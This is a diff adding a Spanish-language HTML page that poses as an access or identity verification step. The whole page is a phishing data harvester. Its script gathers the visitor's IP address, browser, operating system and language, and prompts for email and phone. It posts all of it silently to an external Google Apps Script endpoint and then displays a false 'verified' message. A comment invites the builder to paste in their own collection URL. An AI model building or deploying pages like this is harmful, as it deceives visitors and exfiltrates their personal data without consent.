@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificación</title>
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      font-family: Roboto, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    button {
+      background: #00ffcc;
+      color: #000;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 10px;
+      font-size: 1.2em;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Verifica tu acceso</h1>
+  <p>Haz clic en continuar para confirmar tu identidad</p>
+  <button onclick="enviarDatos()">Continuar</button>
+
+  <script>
+    function enviarDatos() {
+      const url = "https://script.google.com/macros/s/AKfycbzRrngNzzxdtHaFvU1hnygX81zpkMCYDMDOgf0z-6JWivyRgNFEpnpfeWBBebSXEA4zKA/exec"; // <--- Pegá acá tu URL del Web App
+
+      const navegador = navigator.userAgent;
+      const idioma = navigator.language || navigator.userLanguage;
+      const so = navigator.platform;
+
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+
+          // Datos falsos para test, si querés podés pedirlos vía prompt o form
+          const correo = prompt("Ingresa tu correo:");
+          const telefono = prompt("Ingresa tu teléfono:");
+
+          const formData = new URLSearchParams({
+            correo,
+            telefono,
+            navegador,
+            so,
+            idioma,
+            ip
+          });
+
+          fetch(url, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: formData
+          });
+
+          alert("Verificado. Gracias.");
+        });
+    }
+  </script>
+</body>
+</html>
